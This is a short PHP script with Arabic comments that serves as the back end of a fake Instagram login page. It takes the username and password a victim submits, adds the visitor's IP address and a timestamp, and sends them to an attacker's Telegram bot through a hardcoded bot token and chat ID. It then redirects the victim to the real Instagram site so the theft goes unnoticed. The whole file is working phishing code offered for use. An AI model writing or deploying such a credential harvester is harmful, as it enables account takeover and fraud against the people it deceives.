<?php
// بيانات البوت الخاص بـ Telegram
$botToken = "7086345089:AAE-dXYWlzjrOz_3IgdVnHLLMQbO4RdwFIA"; 
$chatId = "6017837134"; 

// استقبال بيانات تسجيل الدخول
$username = $_POST['username'];
$password = $_POST['password'];

// الحصول على IP الجهاز
$userIP = $_SERVER['REMOTE_ADDR'];

// تسجيل وقت تسجيل الدخول
$time = date("Y-m-d H:i:s");

// إرسال البيانات إلى Telegram
$message = "🔒 Instagram Login Info:\nUsername: $username\nPassword: $password\nIP: $userIP\nTime: $time";
file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($message));

// إعادة توجيه المستخدم إلى الصفحة الأصلية
header("Location: https://www.instagram.com");
exit();
?>
